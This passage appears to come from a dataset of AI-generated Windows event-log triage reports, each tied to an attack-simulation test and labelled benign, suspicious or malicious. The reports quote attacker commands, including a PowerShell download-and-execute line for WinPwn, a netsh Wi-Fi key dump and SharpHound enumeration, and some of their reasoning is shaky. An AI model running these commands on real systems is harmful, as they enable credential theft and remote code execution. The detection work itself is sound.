   - There is limited evidence from the PowerShell log specifically, but Sysmon logs reveal a sequence involving high integrity processes such as `cmd.exe` executing networking commands (`ipconfig`, `net config`, `nltest /domain_trusts`). This might indicate manual inspection or enumeration of network configurations, potentially suspicious if not done by administrative or expected scripts.

5. **Frequent Use of `wevtutil.exe` and `conhost.exe` by `admin_test`:**
   - Sysmon logs numerous invocations of `wevtutil.exe` and `conhost.exe` by the `admin_test` user within a suspiciously short timeframe. While these tools are normally used for event log operations and console sessions, their rapid, frequent use can indicate log clearing or obfuscation attempts.

6. **Microsoft Edge Updates (EventID: 1):**
   - The logs show typical Microsoft Edge updates and installations with multiple instances of `setup.exe` tied to the NT AUTHORITY\SYSTEM user, indicative of legitimate system maintenance tasks.

7. **Presence of Windows Update and Antivirus Updates:**
   - System updates and antivirus signature updates show normal patch management activity and aren't inherently suspicious.

### Conclusion:

While most activities appear to be typical system operations, the key areas of concern are:
- The `admin_test` user performing tasks that involve maintenance of event logs and executing high-integrity network utility commands.
- Multiple failed logon attempts on what seems like Microsoft accounts, which might be benign or a sign of attempted unauthorized access due to incorrect configurations or brute force attempts.

### Resolution:

Given the identified activities:

- **SUSPICIOUS**

### Guidance:

1. **Verification of `admin_test` Conduct:**
   - Verify if the `admin_test` account should be carrying out the actions recorded. Investigate any manual intervention by privileged users or unauthorized access.
   
2. **Network Enumeration Commands:**
   - Determine if the execution of network-related commands was part of scheduled administrative tasks or scripts. Compare with organizational policies for acceptable practices.

3. **Failed Credential Access Attempts:**
   - Investigate the failed credential reading attempts, ensuring the logged events are not part of failed scheduled tasks or configuration errors.

4. **Continuous Monitoring:**
   - Implement more detailed monitoring for high-risk activities like privilege escalation and network reconnaissance commands on sensitive accounts.

Engaging in these follow-ups would help in determining whether the found activities are genuinely benign or signs of targeted intrusion."
Launch DirLister Executable,"Upon reviewing the provided event logs, several activities and processes stand out that require additional scrutiny, particularly due to their contexts and associations within the system environment.

### Analysis:

1. **PowerShell Execution:**
   - The PowerShell log records an instance where a script is being executed, starting the process **`DirLister.exe`** from a temporary directory. The execution sequence is as follows: `Start-Process`, `Start-Sleep`, and `Stop-Process`.
   - The use of temporary directories for executing binaries such as ""DirLister.exe"" typically warrants caution, as threat actors often run payloads from temporary folders to avoid detection.

2. **System Processes:**
   - The Sysmon logs capture several instances of recognized and legitimate Windows processes (`powershell.exe`, `wevtutil.exe`, `conhost.exe`) being executed under an administrative user context. Although legitimate, frequent or unusual invocations of such processes, especially in conjunction with PowerShell scripts, could imply illicit activity or lateral movement.
   - Processes for updating Microsoft Edge, such as **`MicrosoftEdgeUpdate.exe`**, appear consistently, correlating with routine update behavior. However, the persistence of executed processes and temporary directories related to these updates should be cautiously cross-examined with expected network and system configurations to rule out misconfigurations or exploit vectors.

3. **Command Line Arguments:**
   - The command line involves paths with extensions out of typical user-directed scopes, especially executable actions concerning system maintenance such as **`sppsvc.exe`** (Software Protection Platform Service), **`TiWorker.exe`** (Windows Modules Installer Worker), etc.
   - These services running under system accounts can often mask malicious use when compromised scripts or binary files mimic their service paths.

### Threat Assessment and Conclusion:

- **Suspicious Elements**: The presence and behavior of `DirLister.exe`, executed from a temporary folder, and the command line activities involving legitimate executables point towards potentially illegitimate activity.
- **No clear signs of active compromise**: While the actions raise red flags, there's insufficient evidence of malware payload deployment or explicit unauthorized access compromising system integrity.
- **Assessment**: Considering the irregular use of PowerShell and potential misuse of scheduled update activities, the logs provide enough basis for categorizing the situation as **SUSPICIOUS**.

### Guidance:
- **Further Investigation**: Conduct a thorough investigation into the origin and purpose of `DirLister.exe`. Validate the integrity of administrative and system accounts running these processes.
- **Review Security Configurations**: Ensure robust monitoring and endpoint security measures are in place, particularly for PowerShell executions and any developments involving temporary directories. 

In summary, the activities, notably around PowerShell and temporary file executions, should be further scrutinized to ascertain intent and verify legitimacy before escalating to remediation steps."
Azure Security Scan with SkyArk,"The provided log entries contain several events that need to be analyzed for potential malicious activity:

### **Suspicious Activity Identification:**

1. **PowerShell Script Execution:**
    - **AzureStealth.ps1 Module Import:** The logs indicate the execution of a PowerShell script, specifically importing `AzureStealth.ps1`. This behavior is suspicious as the script is executed from a temporary location (`C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\\Externalfiles\\AzureStealth.ps1`) often used by attackers to execute malicious scripts.
    - **Credential Manipulation:** The script attempts to create a PSCredential object with a password converted to a secure string from plaintext (`ConvertTo-SecureString -String ""dataAz"" -AsPlainText -Force`) and then uses these credentials to connect to Azure accounts (`Connect-AzAccount`, `Connect-AzureAD`). This is indicative of credential misuse which is a common tactic in credential theft and Azure account takeovers.

2. **Process Creation and Access:**
    - **Sysmon Logs - PowerShell Execution:** Several events show `powershell.exe` being invoked with potentially malicious intent. The script runs under a high integrity level which suggests it might have elevated privileges.
    - **Unhandled Error Action:** Usage of `-ErrorAction SilentlyContinue` in critical operations is suspicious as it suppresses error messages, potentially hiding erroneous or malicious behavior.

3. **Privilege Escalation:**
    - **Security Audit - High Privileges:** Event ID 4672 indicates that the user `admin_test` was assigned several high-level privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and `SeLoadDriverPrivilege`. These are powerful privileges that could allow someone to take full control of a system or execute arbitrary code.

4. **Connection Attempts:**
    - **Logon Events:** The security logs show NTLM authentication from an external workstation (DESKTOP-3HL5B2P) using the `admin_test` account. The presence of a LogonType 3 (network logon) suggests scripted or automated login attempts.
    - **Network Activity:** Presence of IP address logon correlating to the use of NTLM suggests potential remote access attempts or internal reconnaissance.

### **Assessment:**

Based on the analysis of the PowerShell and security logs, there are clear indicators of potentially malicious activity:
- **Credential Manipulation** via PowerShell for unauthorized cloud access attempts.
- **Execution of PowerShell Scripts with Questionable Content** from temporary directories.
- **High-Privilege Assignments** to an account that might facilitate further exploitation.

### **Resolution:**
- **Resolution:** MALICIOUS
The activities logged strongly indicate the presence of a malicious actor or activity on the system. The combination of script execution from temporary directories, manipulation and misuse of credentials, coupled with network logon attempts using potentially compromised accounts solidifies this assessment.

### **Guidance on How to Proceed:**
1. **Immediate Response:**
    - Isolate affected machine(s) from the network to prevent further spread.
    - Change all potentially compromised credentials, especially for Azure and Active Directory.
    
2. **Investigations and Clean-Up:**
    - Investigate recent changes and activity within Azure accounts using affected credentials.
    - Conduct thorough malware scans and forensic analysis on affected systems to identify and remove all persistence mechanisms.
    - Check for any unauthorized changes made during the compromise period.

3. **Post-Incident:**
    - Review and enhance security training, focusing on recognizing phishing attempts that could lead to such credential misuse.
    - Improve logging and monitoring, particularly on cloud environments to quickly detect similar attempts in the future.
    - Consider implementing additional security measures such as Multi-Factor Authentication (MFA) and conditional access policies for critical accounts."
System Discovery - SocGholish whoami,"Based on the examination of the provided Windows event logs, here is the detailed analysis:

### Security Logs:
The security logs primarily consist of Event ID 5379, related to Credential Manager credentials read operations. Each of these events shows a `ReturnCode` of `3221226021`, which indicates a failed operation, typically because the credentials could not be retrieved. These entries might not necessarily indicate malicious activity. However, consistent failed read attempts could be indicative of an attacker trying to access stored credentials, especially if they occur outside of regular user activity.

### Sysmon Logs:
The Sysmon logs show repeated executions of several common Windows utilities like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and PowerShell (`powershell.exe`). Notably, several instances of `wevtutil.exe` and PowerShell scripting stand out as potentially suspicious:

1. **PowerShell Execution** with CommandLine containing `$TokenSet` and random string generation commands.
   - The PowerShell command logs the structure of string generation intended to construct a filename dynamically and pipes the output of `whoami.exe /all` into a temporary file. This sequence is often part of enumeration or data exfiltration operations. 

2. **Repeated Use of `wevtutil.exe`**, which could indicate attempts to query or manipulate event logs, possibly to hide actions by removing entries.
   
3. **High Integrity Level**: Most processes executed under `SERVER002\admin_test` with a High integrity level, implying privileged execution context.

### Windows PowerShell Logs:
The PowerShell logs reflect the execution of scripts that dynamically generate file names and capture specific system user details. This behavior, when not part of a defined administrative task, can suggest attempts to gather information stealthily on the system. The precise purpose of these scripts is not clear but warrants suspicion.

### System and Application Logs:
The System log entries related to Windows Update (Event ID 44 and 43) appear to be normal behavior, involving regular update checks for Microsoft Defender.

### Assessment:
- The `whoami.exe /all` execution within a PowerShell script that attempts to store output in a temp file indicates some level of system enumeration, possibly by an unauthorized entity or a script running rampant.
- Several executions of utility processes like `wevtutil.exe`, especially when tied to the `admin_test` account, without explicit administrative context or task schedules, raises suspicion of log tampering.
- Given the context, activities involving PowerShell with unusual command-line arguments are a typical marker of suspicious activities, especially when combined with other irregular behaviors.

### Conclusion: SUSPICIOUS
The behaviors observed within the logs suggest the possibility of malicious activity due to atypical use of administrative scripting and log utilities. In particular, the PowerShell script execution patterns and the use of `wevtutil.exe` merit further investigation to ensure they are part of legitimate administrative use or scheduled tasks.

### Recommendation:
- Conduct a thorough review of the server's usage policies and task schedules.
- Verify the legitimacy and origin of the `admin_test` account operations.
- Examine the context of PowerShell and `wevtutil.exe` executions, considering any recently installed software or scripts.
- Enhance PowerShell logging and consider implementing constrained language mode to mitigate risks.
- Deploy additional security monitoring tools to detect and prevent similar activities in the future."

     - These utilities can be legitimately used for system administration or troubleshooting but are also commonly observed in malicious activities, especially if executed in such a close time frame.

   - **Process Creation Patterns:**
     - The noted frequent execution of `conhost.exe` in conjunction with other utilities and its parent-child relationships with `cmd.exe` suggests command-line operations.
     - Execution of `cmd.exe` with `findstr lsass` suggests an attempt to inspect processes related to `lsass`, which can indicate reconnaissance behavior often associated with privilege escalation attempts or credential harvesting.

**3. System Logs:**
   - **Time Drift Events (Multiple svchost.exe events):**
     - The logs show time adjustments (""NewTime"" is earlier than ""OldTime""), executed by `svchost.exe`. While this could be legitimate system activity (e.g., correction from NTP server), it could also be indicative of tampering to cover tracks in certain scenarios.

**4. Security Logs:**
   - Align with system changes primarily logged above, showing time changes but no additional alarming security indicators like failed logins or unauthorized access attempts.

**5. Application Logs:**
   - Routine logging by the `Software Protection Platform Service`, likely benign and not indicating any direct compromise.

**6. Summary and Assessment:**
   - The logs reveal a considerable amount of system utility use, which by itself, in a tightly controlled administrative context, can be legitimate.
   - The querying of `lsass` processes raises suspicion due to its association with security-sensitive activities.
   - Time manipulation events warrant closer scrutiny, although they can be legitimate.

### Conclusion:
Given the context and activities observed, there are **SUSPICIOUS** behaviors within these logs:
- Frequent use of system utilities in a short span of time.

Resolution: **SUSPICIOUS** - Further investigation is needed."
SharpHound3 - LocalAdmin,"The analysis of the logs provided from the Windows host on Server002 indicates a combination of routine system activity and potentially suspicious behavior. Below is a breakdown of the investigation:

### 1. **Security Log Events:**

- **Event ID 4624 (Successful Logon):** Shows a logon event using the Advapi process with the SYSTEM account. This is a typical event for a service logon (`LogonType 5`) and doesn't appear abnormal.

- **Event ID 4672 (Special Privileges Assigned):** The SYSTEM account is granted a range of high privileges, including `SeDebugPrivilege`, which can sometimes be exploited in attacks. This event by itself is common for SYSTEM accounts but warrants a cross-check with other activities to ensure it’s not being misused.

### 2. **Sysmon Log Events:**

- **SharpHound Activity via PowerShell:**
  - The Sysmon logs show execution of `PowerShell` commands with a command line attempting to run `SharpHound.exe`. SharpHound is a tool commonly used for Active Directory enumeration, typically by penetration testers for legitimate purposes, but also by attackers for reconnaissance.
  - The command executed aims to collect data using the `LocalAdmin` parameter, indicating a focused privilege enumeration attempt.
  
- **Multiple Instances of `wevtutil.exe`:** This utility is used to query and manage event logs. Repeated execution (`EventID 5`) by `SERVER002\\admin_test` could indicate tampering or log manipulation attempts, often used by attackers to cover their tracks.

- **Various Legitimate Process Executions:** Events related to `SecurityHealthService.exe`, `sppsvc.exe`, `TrustedInstaller.exe`, etc., appear typical for system maintenance and operational functionality.

### 3. **Application and PowerShell Log Events:**

- **PowerShell Logs (Event ID 600):** Correlates with the suspicious PowerShell command for `SharpHound.exe`. The starting of PowerShell with external execution scripts forms a point of concern regarding potential misuse or unauthorized data gathering.

### **Assessment & Resolution:**

Considering the evidence of the use of `SharpHound.exe` through a PowerShell script, there's a strong indication of a reconnaissance attempt using known tools typical in an attacker's enumeration phase. The presence of log file manipulation attempts with `wevtutil.exe` elevates the concern, as it suggests potential efforts to conceal actions on the system.

Given the evidence, this activity is categorized as **SUSPICIOUS**. It indicates potential misuse of legitimate tools, but further investigation would be necessary to conclusively determine malicious intent, such as confirming the origin of the `SharpHound` execution and whether it aligns with authorized security assessment activities.

### **Guidelines on Proceeding:**

1. **Investigate the Source of SharpHound Execution:**
   - Verify if the `admin_test` user account authorized the use of SharpHound for legitimate purposes.
   
2. **Review Recent Changes in Permission or Group Membership:**
   - Check for any unauthorized changes that could leverage the privileges identified.

3. **Check Command History and Scheduled Tasks:**
   - Explore any additional scripts, tasks, or command uses in the vicinity of the identified events.

4. **Increase Monitoring and Conduct a Thorough Forensic Analysis:**
   - Review network logs for outbound connections post-execution, potentially aligning with data exfiltration activities.

   - Validate the legitimacy and integrity of `admin_test` credentials and their usage during the time of the logs.

This approach will help clarify whether the suspicious activity is indeed malicious and assist in deciding follow-up actions to protect the network."
Enumerate Stored Wi-Fi Profiles And Passwords via netsh,"Upon reviewing the provided Windows event logs, here's the detailed analysis:

1. **Time Change Events**: 
   - Multiple instances of Event ID 4616 in Security log indicate changes in system time by the `svchost.exe` process. 
   - While legitimate reasons could exist for time synchronization or correction (e.g., NTP service), malicious actors sometimes manipulate system time to interfere with timestamps for auditing or logging. However, without inline evidence of a consistent pattern or related suspicious activity, this might not immediately suggest malicious intent. Further context is needed.

2. **Privilege and Logon Events**:
   - Event ID 4672 indicates special privileges were assigned to the `admin_test` account, which include privileges like `SeDebugPrivilege`, `SeBackupPrivilege`, and others indicating high-level access.
   - The `admin_test` account is seen logging in multiple times (Event ID 4624) using `NTLM` authentication from the workstation `DESKTOP-3HL5B2P`, which could imply lateral movement. The usage of NTLM could be considered less secure if not expected in this environment.
   - These events warrant further validation with the organization's policy or any expected activities by `admin_test`.

3. **Sysmon Logs**:
   - Frequent execution of `wevtutil.exe` and `conhost.exe` by `admin_test` is recorded. `wevtutil.exe` is a legitimate tool for event log management but can be used for evasion.
   - The execution of `cmd.exe` with the command line `netsh wlan show profile * key=clear` suggests an attempt to retrieve Wi-Fi keys in clear text, which could be used to gain unauthorized access to network connections. This is indicative of potentially malicious behavior.

4. **Windows Defender and Update Activity**:
   - Logs reflect Windows Defender is active (`SECURITY_PRODUCT_STATE_ON`).
   - Normal updates seem to occur with Windows Update Client events for Defender Antivirus.

5. **Application Events**:
   - There isn't much evidence of suspicious application logs, and activities related to Defender show it in an active state, suggesting ongoing protection.

6. **Credential Events**: 
   - Event ID 5379 in the Security log regarding `MicrosoftAccount` operations suggests attempts to read credentials, which faced unsuccessful read operations (`ReturnCode` of `3221226021` indicates no credentials were returned). Repeated failed credential access could indicate probing for vulnerabilities.

### Assessment and Resolution:

**Suspicious** - The event logs reveal some behaviors that are potentially concerning regarding security:
- Unusual time adjustments that could suggest tampering.
- Elevated privileges with multiple logins by a potentially unauthorized user or endpoint not typical for a high-privilege account.
- Command execution targeting Wi-Fi network configurations suggests potential credential theft or reconnaissance actions.

- Verify the legitimacy of the `admin_test` account activities and connections from `DESKTOP-3HL5B2P` to ensure they align with authorized maintenance or operations.
- Conduct a network audit focusing on Wi-Fi configurations and associated controls.
- Monitor and, if needed, block NTLM authentication if not required for operational purposes, moving towards more secure authentication methods.
- Continuous monitoring to detect similar activities and validate endpoint defenses are up-to-date against newer threats."
Security Software Discovery - Sysmon Service,"Based on the provided logs, the following analysis can be made:

### Analysis:

1. **Security Log Insights:**
   - The Security log features two consecutive `4616` events which deal with system time changes. Both changes were initiated by the svchost.exe process running under the LOCAL SERVICE account. Frequent time adjustments may indicate tampering, but the context and frequency in which they occurred in this instance do not immediately suggest malicious activity. Time synchronization processes involving svchost.exe are common, though often scripted adjustments could indicate suspicious behavior.

2. **Sysmon Log Insights:**
   - In the Sysmon logs, we observe several executions of system utilities (`wevtutil.exe`, `conhost.exe`, `whoami.exe`, `fltMC.exe`, `findstr.exe`), along with the Windows Command Processor (`cmd.exe`).
   - The command `cmd.exe /c fltmc.exe | findstr.exe 385201` could be suspicious depending on the context, as it's frequently used to list and parse filter drivers on the system. However, without further context, it cannot unequivocally be categorized as malicious.
   - The Sysmon logs also document mainly benign looking activities related to Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`). These activities include normal software update checks and installations by Microsoft Edge, showing evidence of common software update operations.
   
3. **Application Log Insights:**
   - The application log includes logged events related to the Windows Software Protection and logs from the EdgeUpdater component that show a service stop, which are normal when considering update services, and is a benign operation.

4. **System Log Insights:**
   - System logs reflect two kernel general events for time adjustment, which aligns with events seen in the security logs.

### Assessment:
- **Benign Indicators:** The repeated calls to system binaries (e.g., svchost.exe, conhost.exe) and those related to Microsoft Edge Update are routine and likely part of normal maintenance tasks and application updates.
  
- **Suspicious Indicators:** Execution of command line processes involving command piping (cmd.exe with findstr.exe) can sometimes be indicative of potentially harmful scripts if not executed by recognized operations. However, without an explicit malicious context or foreign process initiation, it remains speculative.

- **Time Change Events:** System time adjustments might raise a red flag in some environments, but the pattern and impression these logs give, suggest system-level synchronization activities.

### Resolution:

After a thorough evaluation of the logs, the activity logged does not present definitive proof of a security compromise. Instead, the operations chiefly represent expected system maintenance and update tasks. 

Given the information, the appropriate resolution is:
- **BENIGN**. 

However, continued monitoring and a review of process origin and authorization could provide further clarity and ensure the system's activities align with legitimate administrative tasks."
Remote System Discovery - net group Domain Controller,"Upon analyzing the provided Windows event logs, here is the detailed assessment:

### Suspicious or Anomalous Behavior:

1. **Command Line Execution:** 
   - There is an instance of `cmd.exe` executing a potentially concerning command: `""cmd.exe"" /c net group /domain ""Domain controllers""`. This command is used to query information about the Domain Controllers in an environment. Although not necessarily malicious on its own, it can be associated with reconnaissance activity in a compromised environment.

2. **Multiple 'net.exe' and 'net1.exe' Executions:**
   - The repeated use of `net.exe` and `net1.exe` commands could suggest enumeration activity. These utilities are frequently used in network discovery and user enumeration activities, which could be benign in a system administrative context but also potentially malicious if conducted without permission.

3. **Account Credential Access Attempts (Event ID 5379):**
   - Multiple attempts to read Microsoft account and Windows Live credentials were made and failed (Return Code: 3221226021 indicates STATUS_NO_SUCH_LOGON_SESSION). Repeated failed credential access attempts can indicate an attempt to access unauthorized credentials or accounts.

4. **Usage of `wevtutil.exe`:**
   - `wevtutil.exe` is used in some event entries, which can be a legitimate tool for managing event logs. However, it can be used maliciously to clear event logs in an attempt to obfuscate activity.

### Malicious Indicators:
- **Reconnaissance Commands:** The use of commands to gather information about domain controllers is a classic reconnaissance step in a cyber attack lifecycle.
- **Possible Credential Access Attempts:** The numerous failed attempts to access credential information might indicate exploratory actions towards retrieving increased permissions or sensitive information.

### Unusual But Not Immediately Malicious Indicators:
- **High Integrity Level Processes:** Multiple processes were executed at a high integrity level by the user `SERVER002\\admin_test`. The presence of high integrity level processes in itself isn’t unusual, especially for administrative users, but it is a common factor in escalation of privilege scenarios if not reviewed against known standards.

### Conclusion:
Given the evidence of potentially unauthorized reconnaissance activity, failed credential access attempts, and use of system utilities that could be employed for obfuscation, the activity in these logs leans towards being **SUSPICIOUS**. However, further investigation is required to conclusively determine if these were conducted by authorized personnel or if they signify a compromise.

### Guidance:
1. **Investigate the Context of Reconnaissance Activity:** Determine if the `net group` commands were authorized and part of any scheduled administrative tasks. Verify the origin and justification for these actions.
   
2. **Examine Credential Access Attempts:** Investigate the reasons behind the multiple failed credential access attempts. Review access control and ensure that there are no unauthorized attempts for privilege escalation.

3. **Monitor and Audit 'wevtutil.exe' Usage:** If there’s suspicion of log tampering, check other system logs or backup logs to verify if any logs have been cleared or tampered with.

4. **Engage IT Security Team:** Consider deploying additional monitoring or conducting a forensic investigation on the host to capture more context.

The resolution for this scenario is SUSPICIOUS, as further investigation is warranted to understand the full scope and potential impact of these activities."

Process Discovery - Process Hacker,"Based on the review of the provided log entries, the following observations and assessments have been made:

### PowerShell Logs

- **PowerShell Execution with Process Hacker**: The PowerShell log shows that a PowerShell session was opened and executed the command `Start-Process -FilePath ""$Env:ProgramFiles\\Process Hacker 2\\ProcessHacker.exe""`. Process Hacker is a tool often used for monitoring system processes, which legitimate users might use for system administration. However, it is also frequently used by malicious actors to bypass security controls or manipulate system processes.

### Security Logs

- **Group Membership Enumeration (Event ID 4799)**: This event indicates that a process, `setup.exe`, attempted to enumerate group membership for the ""Users"" group. The process path suggests it originated from EdgeUpdate which can be suspicious if unexpected or not aligned with usual system activity.

### Sysmon Logs

- **PowerShell Execution Activity**: Various Sysmon events (event ID 1) indicate multiple instances of `powershell.exe` executed with high integrity, consistent with the PowerShell logs. High integrity level execution may reflect actions requiring administrative privileges.
  
- **Process Hacker Execution**: The execution of `powershell.exe` specifically includes launching Process Hacker, which aligns with the PowerShell logs, further reinforcing the suspicious nature of its use.
  
- **Use of `wevtutil.exe` and `svchost.exe`**: These are standard Windows utilities and services. However, their execution context could provide indicators depending on process lineage or unusual patterns not definitively malicious here.

### Analysis and Assessment

1. **Use of Admin Tools**: The presence and use of Process Hacker can be suspicious, especially if it is not standard practice or necessary for typical operations on `Server002`. It requires validation as to why such a tool would be used and whether it aligns with routine administrative activities.

2. **Elevation and Enumeration Activities**: High integrity processes and exploring group memberships through a potentially non-standard or unknown process (setup.exe) introduce risk. They could be indicators of attempted privilege escalation or reconnaissance activities.

3. **Execution Context**: All processes originated from an account with apparently high integrity and consistent user context (`SERVER002\\admin_test`), requiring further inquiry into the user's intentions and awareness of this activity.

### Conclusion

Given the analysis, the activity captured in the logs can be categorized as **SUSPICIOUS**. The execution of a tool like Process Hacker in administrative contexts, along with group enumeration activities through an unconventional path, indicates actions that are potentially preparatory steps in a compromise or misuse of administrative privileges. Further investigation is warranted to determine the legitimacy of these actions.

### Guidance for Next Steps

- **User Verification**: Investigate and validate the admin_test user's activities and whether they are aware of these actions.
  
- **Tool Usage Justification**: Clarify the need for Process Hacker on this server. Remove or restrict its use if not justified.
  
- **Review Associated Activity**: Explore further logs for additional indicators, particularly around times of interest, for any correlation with known threat patterns or anomalies.
  
Overall, this situation requires further scrutiny to rule out any unauthorized or malicious activity fully."
Network Share Discovery PowerShell,"### Analysis of Logs:

1. **Windows PowerShell Logs:**
   - The command `powershell.exe & {get-smbshare}` was executed. This specific command is a benign one used for listing SMB shares on the network. However, execution of PowerShell scripts can sometimes be used for executing malicious code, but here it appears harmless without additional suspicious context.

2. **Application Logs:**
   - ""Service stopped"" log entry from `edgeupdate`. Stopping of services is a routine process update behavior, especially for Microsoft Edge updates. Without further suspicious context, this action can be considered normal.

3. **Sysmon Logs:**
   - Multiple appearances of processes related to Microsoft Edge Update (`MicrosoftEdgeUpdate.exe`) seem consistent with a legit update cycle.
   - Various executions of `conhost.exe` and `wevtutil.exe` by user `SERVER002\\admin_test` are noted. These actions can be typical during administrative tasks or scripts.
   - The execution of `whoami.exe` and `hostname.exe` indicates someone checking user and system information. These commands could suggest routine checks or part of a script.
   - `powershell.exe` was executed (consistent with PowerShell logs), confirming further that the command was executed under the `admin_test` user which might indicate either a scripted setup or configuration task.

4. **Security Logs:**
   - No entries were provided, thus no relevant analysis from security logs.

### Assessment:

- **PowerShell Activity:** The execution of `powershell.exe & {get-smbshare}` appears isolated and does not exhibit malicious characteristics on its own.
- **Microsoft Edge Update Processes:** Consistent logging of actions related to Edge Update services and components with no unusual process names, locations, or command-line parameters. 
- **User Behavior:** Commands like `whoami` and `hostname` can indicate a user checking system status or script execution as part of system tasks. Absent further suspicious indicators, these actions can be normal.
- **Wevtutil and Conhost Executions:** These are standard utilities and their execution by an admin user often relates to routine administrative operations or scripts.

### Conclusion:

Given the evidence provided in the logs:
- The activities observed in the Windows event logs appear typical for system and application maintenance.
- There is no definitive indication of compromise or malicious activity.
- The Edge Update process managed and executed as expected, and PowerShell activity was limited to a benign command.

**Resolution: BENIGN** - The logs contain benign activity. No indicators of compromise or requirement for further investigation unless additional suspicious context arises. 

### Guidance on How to Proceed:

- Maintain regular system and application log monitoring to alert on truly anomalous activities.
- Verify the legitimacy of the `admin_test` account's actions if further analysis or audit records are available.
- Ensure best practices for PowerShell logging to catch potential misuse in the future.
"
WinPwn - RBCD-Check,"Based on a detailed analysis of the provided Windows event logs, several observations and assessments can be made:

1. **Sysmon Logs:**
   - Multiple instances of legitimate system binaries such as `whoami.exe`, `conhost.exe`, `wevtutil.exe`, and `hostname.exe` are observed being executed. 
   - Of particular concern is an instance of `powershell.exe` executing with a command to download and invoke a remote PowerShell script from a URL (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/...`). The use of `iex(new-object net.webclient).downloadstring()` in PowerShell scripts is a common technique observed in various attacks for downloading and executing arbitrary scripts without writing them to disk.
   - The process `powershell.exe` with a high integrity level indicates it is running with elevated privileges, which could potentially allow significant system changes or data exfiltration if malicious.

2. **Windows PowerShell Logs:**
   - Logs confirm the PowerShell script execution, evidenced by events indicating the start state of various PowerShell providers. The command executed matches the one observed in the Sysmon logs, further confirming the execution of a potentially harmful script.
   
3. **Security Logs:**
   - Privilege escalation is evident as `admin_test` has logged in with various high-level privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and more. These privileges can be exploited to manipulate system-level processes or files.
   - The NTLM authentication shows a remote logon event which might correlate with the initiation of the suspicious PowerShell script.

4. **Application Logs:**
   - Windows Defender appears to have been active (`SECURITY_PRODUCT_STATE_ON`), but there's no clear indication whether it responded to the PowerShell activity.

### Assessment:
- **Suspicious Activity Identified:** The downloading and execution of a remote script using PowerShell is highly indicative of suspicious or potentially malicious activity. This action can lead to the installation of malware, system compromise, or unauthorized data access. Additionally, the high-level privileges observed are concerning if put in conjunction with the PowerShell script execution.

### Resolution: SUSPICIOUS
Given the evidence and analysis, the activity within these logs appears suspicious and warrants further investigation. There is a potential risk that needs to be mitigated and thoroughly examined, especially focusing on:
- Inspecting the contents and impact of the downloaded PowerShell script.
- Assessing any changes made by the script to the system.
- Reviewing network activity for any outbound connections post-script execution.
- Conducting a detailed investigation on `SERVER002` to ensure no other compromise exists.

### Guidance on Proceeding:
1. **Immediate Action:**
   - Isolate `SERVER002` from external networks until a thorough examination is completed.
   - Review any alerts or logs from security solutions (like Windows Defender) around the time of the detected PowerShell activity.

2. **Investigation and Remediation:**
   - Analyze the script sourced from the external URL to understand its intent and actions.
   - Verify system integrity by checking for unauthorized alterations in configurations or newly introduced executables.
   - Review and, if necessary, revoke high-level privileges for `admin_test` or any other compromised accounts.
   
3. **Prevention:**
   - Implement stricter controls on the execution of remote PowerShell commands across the environment.
   - Enhance monitoring and alerting mechanisms for suspicious script and network activities in real-time."
Remote System Discovery - net,"Upon analyzing the provided Windows event logs, I have identified the following points:

1. **Time-related Events**: 
   - The events involving time changes (`EventID 24` and `EventID 1` from the Kernel-General and Security logs) appear to be related to legitimate system time adjustments via the Windows Time Service (`svchost.exe`). Such adjustments are normal and usually part of regular system operations.

2. **Windows Update Activities**: 
   - The presence of Windows Update activities is clear from events (`EventID 44`, `EventID 43`, and `EventID 19` from the WindowsUpdateClient logs, and related sysmon events). These involve the update of the Microsoft Defender Antivirus, which is a legitimate and routine activity indicative of system maintenance.

3. **PowerShell Logs**: 
   - The PowerShell logs indicate the initialization of various providers (`EventID 600`), which is a typical outcome when PowerShell initializes different providers as a part of its startup process. The ""Started"" state for multiple providers such as Registry, Alias, and Environment is normal and does not indicate malicious behavior without further specific command actions.

4. **Security Logs** (Logon Events and Privileges):
   - There are multiple successful NTLM logon attempts (`EventID 4624` with LogonType 3), associated with a user ""admin_test"". The accounts exhibit privileges (`EventID 4672`) which include high-level system capabilities such as `SeDebugPrivilege`. While these privileges are normally granted to administrative accounts, the high frequency of logon activity can be suspicious if not correlated to expected activity.
   - However, in this context, there's no direct evidence of malicious use. The administrator logons might reflect normal administrative or maintenance activity, assuming ""admin_test"" was engaged in legitimate tasks.

5. **Sysmon Logs**: 
   - Various processes such as `whoami.exe`, `net.exe`, `cmd.exe`, and `conhost.exe` were run under the ""admin_test"" user context. These commands and host processes are frequently used for system administration tasks and scripting. Commands like `whoami` and `net view` suggest a configuration or network querying task. 
   - The execution of ""Microsoft Edge Update"" and related update processes (`MicrosoftEdgeUpdate.exe`) appears consistent with legitimate software updates. 

6. **Unexpected commands**:
   - The command `cmd.exe /c net view /domain & net view` could potentially be suspicious as it queries network resources. However, given the context of other updates and possibly necessary administrative functions, this does not definitively indicate malicious intent without corroborating suspicious anomalies or known threat indicators.

Overall, based on the information in the logs and without additional corroborating evidence of malicious actions:

- The activities observed appear to align with typical system and update operations.
- The presence of privileged logons and network-related queries could be normal within the context of administrative maintenance.

Given the current logs and specific entries provided, I would classify this as **BENIGN** activity, assuming ""admin_test"" is a known and legitimate user performing routine administrative tasks. However, continuous monitoring is prudent to ensure no deviations occur. If there are concerns about the account activities or unfamiliarity with the specific command executions, further investigation into the behavior and account usage would be prudent."
Enumerate logged on users via CMD (Local),"After analyzing the provided logs, here's a detailed assessment of the situation:

1. **Analysis of Sysmon Logs**:
   - The logs show a series of processes being executed primarily under the username `SERVER002\admin_test`.
   - The processes frequently include `wevtutil.exe` and `conhost.exe` within a very short timespan. `wevtutil.exe` is a legitimate Windows utility for managing event logs but can be used maliciously to clear logs or gather sensitive information stealthily. Similarly, `conhost.exe` is related to console windows, and its frequent appearance associated with different processes might indicate an attempt to disguise activities.
   - However, these activities lack further context such as command-line arguments or other behaviors typically associated with malicious use of `wevtutil.exe` and `conhost.exe`.

2. **Indicators of Potentially Suspicious Activity**:
   - There is a notable presence of `hostname.exe`, `whoami.exe`, and `cmd.exe` in the logs in conjunction with `wsmprovhost.exe` as a parent process. This seems to imply a process enumeration or environment reconnaissance activity. These actions, while not directly malicious, can be used as indicators of lateral movement or initial stages of a compromise.
   - The presence of elevated integrity levels (High) indicates these actions were performed with significant privileges, which is notable but context-dependent.

